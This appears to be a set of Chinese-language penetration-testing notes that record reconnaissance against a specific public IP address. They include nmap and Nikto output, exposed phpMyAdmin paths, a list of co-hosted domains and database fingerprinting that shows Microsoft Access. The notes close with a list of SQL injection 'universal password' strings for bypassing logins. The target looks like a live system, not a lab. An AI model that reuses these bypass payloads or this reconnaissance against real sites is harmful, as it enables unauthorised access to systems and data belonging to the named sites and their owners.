+ Server: Microsoft-IIS/10.0
+ X-Powered-By: ASP.NET

+ nmap 扫描

```shell
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
3306/tcp open  mysql
Device type: general purpose
Running: Linux 2.4.X, Microsoft Windows XP|7|2012
OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
OS details: DD-WRT v24-sp2 (Linux 2.4.37), Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
```

+ Nikto 扫描

```shell
nikto -h http://example.com -output ~/nikto.html -Format htm
# 结果
http://154.80.253.139/phpMyAdmin/index.php
http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上
http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现
```

+ 最牛逼的信息收集网站

```shell
https://dnslytics.com/ip/154.80.253.139

# 旁站
bjshuxue.com	
pinkewang.com
# 数据库信息
[INFO] the back-end DBMS is Microsoft Access
web server operating system: Windows 10 or 2016
web application technology: ASP.NET, Microsoft IIS 10.0, ASP
back-end DBMS: Microsoft Access

i03.net	
tzsiss.com.cn	
cz-huatian.com	
nplxs.com	
wangmin.name	
4006080.com	
flyemail.cn	
zj5156.org

# 邮箱 2018-08-05
mail.jianuo2.xyz
mail.taiyangyy.top
```

+ 目录扫描

```shell
http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
```



+ 万能密码

```shell
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
```